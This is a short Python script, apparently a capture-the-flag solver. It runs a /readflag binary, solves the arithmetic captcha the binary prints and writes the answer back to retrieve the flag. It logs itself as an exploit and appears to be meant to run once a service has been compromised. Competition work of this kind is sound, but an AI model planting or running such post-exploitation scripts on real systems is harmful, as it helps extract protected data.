import subprocess
import re
import sys
import time
import os

# 强制刷新 stderr
def log_stderr(msg):
    sys.stderr.write(f"[EXPLOIT] {msg}\n")
    sys.stderr.flush()

def solve_captcha():
    # 脚本一启动就打印，证明配置加载成功
    log_stderr("SCRIPT STARTED!!! Attempting to run /readflag...")
    
    try:
        # 检查 /readflag 是否存在
        if not os.path.exists("/readflag"):
            log_stderr("ERROR: /readflag not found!")
            return

        p = subprocess.Popen(
            ["/readflag"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=0
        )

        buffer = ""
        while True:
            char = p.stdout.read(1)
            if not char: break
            buffer += char
            # 实时回显 /readflag 的输出
            sys.stderr.write(char)
            sys.stderr.flush()

            if "input your answer:" in buffer:
                break
        
        # 提取算式
        content = buffer.replace("input your answer:", "").strip()
        match = re.search(r'[\d\+\-\*\/\(\)\s]+$', content)
        
        if match:
            equation = match.group(0).strip()
            log_stderr(f"Equation found: {equation}")
            try:
                answer = int(eval(equation))
                log_stderr(f"Calculated answer: {answer}")
                
                p.stdin.write(f"{answer}\n")
                p.stdin.flush()
                
                # 读取 Flag
                rest = p.stdout.read()
                log_stderr(f"\n[+] OUTPUT FROM READFLAG:\n{rest}")
            except Exception as e:
                log_stderr(f"Math error: {e}")
        else:
            log_stderr("No equation found in output.")

    except Exception as e:
        log_stderr(f"Execution error: {e}")

if __name__ == "__main__":
    solve_captcha()
